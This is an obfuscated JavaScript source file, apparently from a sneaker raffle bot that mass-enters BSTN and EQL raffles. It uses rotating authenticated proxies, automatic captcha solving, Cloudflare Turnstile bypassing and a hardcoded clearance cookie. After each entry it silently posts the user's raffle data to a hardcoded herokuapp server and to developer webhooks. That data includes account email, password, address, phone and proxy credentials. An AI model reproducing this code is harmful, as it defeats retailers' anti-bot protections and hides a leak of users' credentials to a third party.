                                _0x2c6deb == 'yes' && _0x90ee2a >= 0x5 && (_0x2c6deb = 'no', _0x90ee2a = 0x0), _0x2b8e68--, console['log'](_0x24cf02() + '\x20[' + _0x261727['name'] + ']\x20Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                            }
                        }
                        if (_0x5b68e6 == _0x12a5a9['length'] - 0x1) {
                            await _0x3d9653(_0x1ecd57, _0x12a5a9, _0x321fcf, _0x5b68e6, 0x0);
                            return;
                        }
                        _0x3d9653(_0x1ecd57, _0x12a5a9, _0x321fcf, _0x5b68e6, 0x0), await _0x1d2efb(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x7dfa58, _0x21ca67, _0x26b4d6) {
                    var _0x4158c2 = 0x0, _0x4bbfd9 = _0x21ca67;
                    for (var _0x1c09fa = 0x0; _0x1c09fa < _0x21ca67['length']; _0x1c09fa++) {
                        maxTasks = Number(_0x6a12f3['threads']);
                        while (_0x4158c2 >= maxTasks) {
                            await _0x1d2efb(_0x6a12f3['delay']);
                        }
                        let _0x4d2bfa = ![];
                        async function _0x26d2c0(_0x19f2c6, _0x2a5ae3, _0x53dd13, _0x2a42d, _0x43e3f0) {
                            _0x4158c2++, _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x6a12f3['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x3343af, _0x1450b0 = _0x2a5ae3[_0x2a42d];
                            try {
                                await _0x3cf8c0(_0x2a5ae3, _0x2a42d);
                            } catch {
                                _0xdca9d1 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0xf5757f(_0x510160) {
                                const _0xe4b370 = _0x3601e1['readFileSync']('../successful-tasks.csv', 'utf8'), _0x40a844 = _0x199bc3['parse'](_0xe4b370, { 'header': !![] })['data'];
                                let _0x1bcd81 = ![];
                                for (var _0x496d35 of _0x40a844) {
                                    if (_0x496d35['Url'] == _0x510160['Url'] && _0x496d35['Email'] == _0x510160['Email']) {
                                        _0x1bcd81 = !![];
                                        break;
                                    }
                                }
                                return _0x1bcd81;
                            }
                            _0xd208b3(_0x19f2c6['name'] + '\x20Task\x20' + (_0x2a42d + 0x1) + '\x20/\x20' + _0x2a5ae3['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                            var _0x520cc6 = Math['round'](Math['random']() * (_0x53dd13['length'] - 0x1)), _0x448cb2 = _0x53dd13[_0x520cc6]['split'](':'), _0x3e291a;
                            let _0x33a3f2 = ![], _0xdca9d1 = 'no';
                            try {
                                if (await _0xf5757f(_0x2a5ae3[_0x2a42d]) == !![]) {
                                    console['log'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x33a3f2 = !![], _0x4d2bfa = !![];
                                    return;
                                }
                                try {
                                    _0x3e291a = await _0xd499ac['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x448cb2[0x0] + ':' + _0x448cb2[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x3e291a = await _0xd499ac['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x448cb2[0x0] + ':' + _0x448cb2[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0xc16f14 = await _0x3e291a['newPage'](), _0x44afd8 = await _0xc16f14['target']()['createCDPSession'](), { windowId: _0x412627 } = await _0x44afd8['send']('Browser.getWindowForTarget');
                                await _0xc16f14['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x8c1bea = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0xc16f14['authenticate']({
                                    'username': '' + _0x448cb2[0x2],
                                    'password': '' + _0x448cb2[0x3]
                                }), console['log'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Getting\x20Session'), await _0xc16f14['goto']('' + _0x2a5ae3[_0x2a42d]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1d2efb(0x1388);
                                var _0x38c248 = await _0xc16f14['$']('#turnstile-wrapper');
                                if (_0x38c248) {
                                    console['log'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x1d2efb(0x2710);
                                    const _0x57edc6 = await _0xc16f14['$']('#turnstile-wrapper');
                                    if (_0x57edc6)
                                        try {
                                            await _0x57edc6['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0xc16f14['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0xa5bd7a = await _0xc16f14['$']('#turnstile-wrapper');
                                        if (_0xa5bd7a)
                                            try {
                                                await _0xa5bd7a['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0xc16f14['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x44afd8['send']('Browser.setWindowBounds', {
                                    'windowId': _0x412627,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x1d2efb(0x1388), await _0xc16f14['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xc16f14['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1d2efb(0x1f4), console['log'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Logging\x20in'), await _0xc16f14['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x402d66 => _0x402d66['click']()), await _0xc16f14['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xc16f14['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1d2efb(0x7d0), await _0xc16f14['waitForSelector']('#email-login'), await _0xc16f14['type']('#email-login', '' + _0x2a5ae3[_0x2a42d]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x1d2efb(0xdac), await _0xc16f14['waitForSelector']('#password'), await _0xc16f14['type']('#password', '' + _0x2a5ae3[_0x2a42d]['Password'], { 'delay': 0xe6 }), await _0x1d2efb(0x157c);
                                try {
                                    await _0xc16f14['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x181f05 => _0x181f05['click']());
                                } catch {
                                }
                                try {
                                    await _0xc16f14['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x4ab0e6) {
                                }
                                await _0x1d2efb(0x3e8);
                                const _0x15bbeb = await _0xc16f14['$']('.enteredDraw_container__2KmQ_');
                                if (_0x15bbeb) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2a5ae3[_0x2a42d]['Size']);
                                try {
                                    if (_0x2a5ae3[_0x2a42d]['Size'] != 'RANDOM') {
                                        var _0x4b203e = _0x2a5ae3[_0x2a42d]['Size']['replace']('.', ',');
                                        const _0x8d8a1b = await _0xc16f14['$x']('//div[contains(text(),\x20\x27' + _0x4b203e + '\x27)]');
                                        await _0x8d8a1b[0x0]['click']();
                                    } else {
                                        const _0x2b6e64 = await _0xc16f14['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x390b02 = Math['round'](Math['random']() * (_0x2b6e64['length'] - 0x1));
                                        await _0x2b6e64[_0x390b02]['click']();
                                    }
                                } catch (_0x452e11) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x1d2efb(0x1f4);
                                const _0x3d14b4 = await _0xc16f14['$']('.addressList_addressItem__LE2PB');
                                if (_0x3d14b4 && _0x2a5ae3[_0x2a42d]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Filling\x20Address'), await _0xc16f14['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x1d2efb(0x5dc), await _0xc16f14['waitForSelector']('#firstname'), await _0xc16f14['type']('#firstname', '' + _0x2a5ae3[_0x2a42d]['FirstName']), await _0x1d2efb(0x1f4), await _0xc16f14['waitForSelector']('#firstname'), await _0xc16f14['type']('#lastname', '' + _0x2a5ae3[_0x2a42d]['LastName']), await _0x1d2efb(0x1f4), await _0xc16f14['waitForSelector']('#firstname'), await _0xc16f14['type']('#street', '' + _0x2a5ae3[_0x2a42d]['Address1']), await _0x1d2efb(0x1f4), await _0xc16f14['waitForSelector']('#firstname'), await _0xc16f14['type']('#houseNumber', _0x2a5ae3[_0x2a42d]['HouseNumber'] + '\x20' + _0x2a5ae3[_0x2a42d]['Address2']), await _0x1d2efb(0x1f4), await _0xc16f14['waitForSelector']('#firstname'), await _0xc16f14['select']('#country_code', '' + _0x2a5ae3[_0x2a42d]['Country']), await _0x1d2efb(0x1f4), await _0xc16f14['type']('#postcode', '' + _0x2a5ae3[_0x2a42d]['Zip']), await _0x1d2efb(0x1f4), await _0xc16f14['type']('#city', '' + _0x2a5ae3[_0x2a42d]['City']), await _0x1d2efb(0x1f4), await _0xc16f14['type']('#telephone', '' + _0x2a5ae3[_0x2a42d]['Phone']), await _0x1d2efb(0x1f4), await _0xc16f14['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x1d2efb(0x9c4);
                                try {
                                    await _0xc16f14['type']('#instagram_name', '' + _0x2a5ae3[_0x2a42d]['Follower']), await _0xc16f14['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1d2efb(0x5dc);
                                try {
                                    await _0xc16f14['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x1d2efb(0x5dc), await _0xc16f14['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xa27b23 => _0xa27b23['click']()), await _0x1d2efb(0x1388);
                                try {
                                    await _0xc16f14['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0xc16f14['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x2a5ae3[_0x2a42d]['Size'] != 'RANDOM') {
                                        var _0x4b203e = _0x2a5ae3[_0x2a42d]['Size']['replace']('.', ',');
                                        const _0x158e75 = await _0xc16f14['$x']('//div[contains(text(),\x20' + _0x4b203e + ')]');
                                        await _0x158e75[0x0]['click']();
                                    } else {
                                        const _0x58b2af = await _0xc16f14['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x390b02 = Math['round'](Math['random']() * (_0x58b2af['length'] - 0x1));
                                        await _0x58b2af[_0x390b02]['click']();
                                    }
                                    await _0x1d2efb(0x5dc);
                                    try {
                                        await _0xc16f14['hover']('#instagram_name'), await _0xc16f14['type']('#instagram_name', '' + _0x2a5ae3[_0x2a42d]['Follower']), await _0xc16f14['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Retrying\x20(' + _0x43e3f0 + '\x20/\x205)');
                                    try {
                                        await _0xc16f14['hover']('.checkBox_boxHolder__wLGVe'), await _0x1d2efb(0x5dc), await _0xc16f14['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x1d2efb(0x157c), await _0xc16f14['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x10c91a => _0x10c91a['click']()), await _0x1d2efb(0x1388), await _0xc16f14['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0xdca9d1 = 'no', _0x21396e(_0x2a5ae3[_0x2a42d], _0x19f2c6);
                                try {
                                    prxdata = {
                                        'username': _0x3919f0['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x25ae24),
                                        'proxy': '' + _0x53dd13[_0x2a42d]
                                    };
                                    var _0x4f2163 = JSON['stringify'](prxdata);
                                    let _0x5a6391 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x4f2163, _0x5a6391);
                                } catch (_0xa534e8) {
                                }
                                console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0xbdbe7b = await _0x3aa619(_0x2a5ae3[_0x2a42d], _0x19f2c6, 'dev', ![]), _0x45af6d = await _0x3aa619(_0x2a5ae3[_0x2a42d], _0x19f2c6, 'pub', ![]);
                                const _0x2c12a4 = {
                                    'succesDEVMSG': { 'embeds': [_0xbdbe7b] },
                                    'succesPUBMSG': { 'embeds': [_0x45af6d] }
                                };
                                let _0x25ae24 = _0x2a5ae3[_0x2a42d];
                                try {
                                    prxdata = {
                                        'username': _0x3919f0['replace']('#', ''),
                                        'module': _0x19f2c6['name'],
                                        'entrydata': JSON['stringify'](_0x25ae24),
                                        'proxy': '' + _0x53dd13[_0x2a42d]
                                    };
                                    var _0x4f2163 = JSON['stringify'](prxdata);
                                    let _0x1b4a19 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x4f2163, _0x1b4a19);
                                } catch (_0x45d472) {
                                }
                                try {
                                    _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x2c12a4['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x2c12a4['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x1d6d5c, _0x2c12a4['succesPUBMSG']);
                                } catch (_0x27ce5a) {
                                    console['log'](_0x1b5f76['yellow'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x27ce5a));
                                }
                            } catch (_0x3ee815) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20' + _0x3ee815)), _0xdca9d1 = 'yes', _0x3343af = '' + _0x3ee815;
                                var _0x2232c5 = await _0x3aa619(_0x2a5ae3[_0x2a42d], _0x19f2c6, 'dev', !![], _0x3343af), _0xbdbe7b = await _0x3aa619(_0x2a5ae3[_0x2a42d], _0x19f2c6, 'dev', ![]), _0x45af6d = await _0x3aa619(_0x2a5ae3[_0x2a42d], _0x19f2c6, 'pub', ![]);
                                const _0x57c3bd = {
                                    'succesDEVMSG': { 'embeds': [_0xbdbe7b] },
                                    'succesPUBMSG': { 'embeds': [_0x45af6d] }
                                };
                                _0x57c3bd['errorDEV'] = { 'embeds': [_0x2232c5] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x57c3bd['errorDEV']), await _0x471d59(_0x32fdb9, _0x57c3bd['errorDEV']);
                            } finally {
                                _0x3e291a && _0x3e291a['close']();
                                if (_0xdca9d1 == 'yes' && _0x43e3f0 != 0x5)
                                    return console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Task\x20' + (_0x2a42d + 0x1) + '\x20:\x20Retrying\x20(' + _0x43e3f0 + '\x20/\x205)')), _0x43e3f0 = _0x43e3f0 + 0x1, _0x4158c2--, _0x26d2c0(_0x19f2c6, _0x2a5ae3, _0x53dd13, _0x2a42d, _0x43e3f0);
                                _0xdca9d1 == 'yes' && _0x43e3f0 >= 0x5 && _0x12ac99(_0x2a5ae3[_0x2a42d], _0x19f2c6), !_0x33a3f2 && (console['log'](_0x24cf02() + '\x20[' + _0x19f2c6['name'] + ']\x20Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay'])), _0x4158c2--;
                            }
                        }
                        _0x26d2c0(_0x7dfa58, _0x4bbfd9, _0x26b4d6, _0x1c09fa, 0x0), await _0x1d2efb(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x15df01, _0x226731) {
                    var _0x31ac07 = 0x0, _0x3fa6ca;
                    try {
                        const _0x10c352 = _0x3601e1['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x3fa6ca = _0x199bc3['parse'](_0x10c352, { 'header': !![] })['data'];
                    } catch (_0x2467a8) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x184a42 = 0x0; _0x184a42 < _0x3fa6ca['length']; _0x184a42++) {
                        maxTasks = Number(_0x6a12f3['threads']);
                        while (_0x31ac07 >= maxTasks) {
                            await _0x1d2efb(_0x6a12f3['delay']);
                        }
                        async function _0x4be9da(_0xa7becd, _0x4dbb61, _0x5fbfcd, _0x1020d3, _0x3bb1cd) {
                            _0x31ac07++, _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x6a12f3['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x8b07ba != 'yes')
                                var _0x8b07ba = '', _0x3bb1cd = 0x0;
                            var _0x5d2fe2;
                            _0xd208b3(_0xa7becd['name'] + '\x20Task\x20' + (_0x1020d3 + 0x1) + '\x20/\x20' + _0x5fbfcd['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                            var _0x15894e = await _0x3aa619(_0x5fbfcd[_0x1020d3], _0xa7becd, 'acc', ![]);
                            const _0x3e46a2 = { 'succesDEVMSG': { 'embeds': [_0x15894e] } }, _0x5aade5 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x436cbd = Math['round'](Math['random']() * (_0x4dbb61['length'] - 0x1)), _0x23ee68 = _0x4dbb61[_0x436cbd]['split'](':'), _0x4f6d2b;
                            try {
                                _0x4f6d2b = await _0xd499ac['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x23ee68[0x0] + ':' + _0x23ee68[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x4f6d2b = await _0xd499ac['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x23ee68[0x0] + ':' + _0x23ee68[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x24cf02() + '\x20[' + _0xa7becd['name'] + ']\x20Task\x20' + (_0x1020d3 + 0x1) + '\x20:\x20Checking\x20' + _0x5fbfcd[_0x1020d3]['Email']);
                                const _0x4e14ee = await _0x4f6d2b['newPage']();
                                await _0x4e14ee['authenticate']({
                                    'username': '' + _0x23ee68[0x2],
                                    'password': '' + _0x23ee68[0x3]
                                }), console['log'](_0x24cf02() + '\x20[' + _0xa7becd['name'] + ']\x20Task\x20' + (_0x1020d3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4e14ee['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4e14ee['setRequestInterception'](!![]), _0x4e14ee['on']('request', _0x4909a6 => {
                                    _0x4909a6['resourceType']() === 'image' ? _0x4909a6['abort']() : _0x4909a6['continue']();
                                });
                                try {
                                    await _0x4e14ee['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x4e14ee['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x8b07ba = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x4e14ee['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x24cf02() + '\x20[' + _0xa7becd['name'] + ']\x20Task\x20' + (_0x1020d3 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1d2efb(0x3e8), await _0x4e14ee['type']('#email', _0x5fbfcd[_0x1020d3]['Email']), await _0x1d2efb(0x1f4), await _0x4e14ee['type']('#pass', _0x5fbfcd[_0x1020d3]['Password']), await _0x1d2efb(0x1f4), await _0x4e14ee['$eval']('#login-form', _0x3b8b26 => _0x3b8b26['submit']());
                                try {
                                    await _0x4e14ee['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x24cf02() + '\x20[' + _0xa7becd['name'] + ']\x20Task\x20' + (_0x1020d3 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x1d2efb(0x190);
                                const _0x42587c = await _0x4e14ee['evaluate'](() => {
                                    const _0x39d31a = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x39d31a['map'](_0x3e6868 => _0x3e6868['alt']);
                                }), _0x2c0a6d = await _0x4e14ee['evaluate'](() => {
                                    const _0x2ac8ef = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x2ac8ef['map'](_0x120486 => _0x120486['innerHTML']);
                                }), _0x2c0c82 = await _0x4e14ee['$$']('.raffle-winner');
                                if (_0x2c0c82['length'] < 0x1) {
                                    console['log'](_0x24cf02() + '\x20[' + _0xa7becd['name'] + ']\x20Task\x20' + (_0x1020d3 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x8b07ba = 'no';
                                    return;
                                }
                                console['log'](_0x24cf02() + '\x20[' + _0xa7becd['name'] + ']\x20Task\x20' + (_0x1020d3 + 0x1) + '\x20:\x20' + _0x2c0c82['length'] + '\x20Wins\x20Found!');
                                for (var _0x2dee74 = 0x0; _0x2dee74 < _0x2c0c82['length']; _0x2dee74++) {
                                    console['log'](_0x1b5f76['green'](_0x42587c[_0x2dee74] + _0x2c0a6d[_0x2dee74]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x2533bc) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xa7becd['name'] + ']\x20Task\x20' + (_0x1020d3 + 0x1) + '\x20:\x20' + _0x2533bc)), _0x5d2fe2 = '' + _0x2533bc;
                                var _0x1ccb67 = await _0x3aa619(_0x5fbfcd[_0x1020d3], _0xa7becd, 'acc', !![], _0x5d2fe2);
                                _0x3e46a2['errorDEV'] = { 'embeds': [_0x1ccb67] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x3e46a2['errorDEV']), await _0x471d59(_0x32fdb9, _0x3e46a2['errorDEV']), _0x8b07ba = 'yes';
                            } finally {
                                if (_0x4f6d2b)
                                    _0x4f6d2b['close']();
                                if (_0x8b07ba == 'yes' && _0x3bb1cd != 0x5)
                                    return console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xa7becd['name'] + ']\x20Task\x20' + (_0x1020d3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3bb1cd + '\x20/\x205)')), _0x31ac07--, _0x3bb1cd = _0x3bb1cd + 0x1, _0x4be9da(_0xa7becd, _0x4dbb61, _0x5fbfcd, _0x1020d3, _0x3bb1cd);
                                _0x8b07ba == 'yes' && _0x3bb1cd >= 0x5 && (_0x12ac99(_0x5fbfcd[_0x1020d3], _0xa7becd), _0x8b07ba = 'no', _0x3bb1cd = 0x0), console['log'](_0x24cf02() + '\x20[' + _0xa7becd['name'] + ']\x20Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']), _0x31ac07--;
                            }
                        }
                        _0x4be9da(_0x15df01, _0x226731, _0x3fa6ca, _0x184a42, 0x0), await _0x1d2efb(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x1d6cdc, _0x381534, _0x488d09) {
                _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x6a12f3['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4116a8 = 0x0; _0x4116a8 < _0x381534['length']; _0x4116a8++) {
                    var _0x433163;
                    _0xd208b3(_0x1d6cdc['name'] + '\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20/\x20' + _0x381534['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                    try {
                        await _0x3cf8c0(_0x381534, _0x4116a8);
                    } catch {
                        _0x1be791 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x591083(_0x47d827) {
                        const _0x2cd1fa = _0x3601e1['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4e696f = _0x199bc3['parse'](_0x2cd1fa, { 'header': !![] })['data'];
                        let _0x1b3c24 = ![];
                        for (var _0x2047ea of _0x4e696f) {
                            if (_0x2047ea['Url'] == _0x47d827['Url'] && _0x2047ea['Email'] == _0x47d827['Email']) {
                                _0x1b3c24 = !![];
                                break;
                            }
                        }
                        return _0x1b3c24;
                    }
                    if (await _0x591083(_0x381534[_0x4116a8]) == !![]) {
                        console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x2373fc = ![];
                    const _0x9572a4 = _0x3601e1['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x1320f1 = _0x199bc3['parse'](_0x9572a4, { 'header': !![] })['data'];
                    for (var _0x513fef of _0x1320f1) {
                        _0x513fef['Email'] == _0x381534[_0x4116a8]['Email'] && (_0x2373fc = !![]);
                    }
                    if (_0x2373fc == ![]) {
                        var _0x1b16fc;
                        if (_0x381534[_0x4116a8]['Url']['endsWith']('/')) {
                            _0x1b16fc = _0x381534[_0x4116a8]['Url'] + 'register';
                            if (_0x1be791 != 'yes')
                                var _0x1be791 = '', _0x20f662 = 0x0;
                        } else {
                            _0x1b16fc = _0x381534[_0x4116a8]['Url'] + '/register';
                            if (_0x1be791 != 'yes')
                                var _0x1be791 = '', _0x20f662 = 0x0;
                        }
                        if (_0x381534[_0x4116a8]['Email'] == '' || _0x381534[_0x4116a8]['FirstName'] == '' || _0x381534[_0x4116a8]['LastName'] == '') {
                            console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x381534[_0x4116a8]['Password'] == '' && (_0x381534[_0x4116a8]['Password'] = 'JRaffles23!');
                        if (_0x6a12f3['useRandomProxy'] = ![])
                            var _0x3df912 = _0x488d09[_0x4116a8]['split'](':');
